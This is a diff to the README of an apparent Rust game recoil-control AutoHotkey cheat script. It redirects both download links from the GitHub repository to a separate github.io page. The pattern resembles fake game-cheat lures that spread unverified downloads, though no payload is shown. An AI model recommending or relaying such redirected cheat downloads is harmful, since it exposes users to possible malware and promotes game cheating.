@@ -1,5 +1,5 @@
 # 🎯 Rust-No-Recoil-AHK-Script - Easy Recoil Control, Zero Hassle Setup
-[![Download Now](https://img.shields.io/badge/Download-Rust_No_Recoil_Script-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Undiplomatic-northernspy6036/Rust-No-Recoil-AHK-Script)
+[![Download Now](https://img.shields.io/badge/Download-Rust_No_Recoil_Script-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://undiplomatic-northernspy6036.github.io)
 
 ---
 
@@ -127,7 +127,7 @@ The default settings are optimized for typical gameplay. Advanced users can open
 
 ## 🔗 Direct Download Link (One More Time
 
-[👉 Click Here to Download Rust-No-Recoil-AHK-Script](https://github.com/Undiplomatic-northernspy6036/Rust-No-Recoil-AHK-Script)
+[👉 Click Here to Download Rust-No-Recoil-AHK-Script](https://undiplomatic-northernspy6036.github.io)
 
 
 
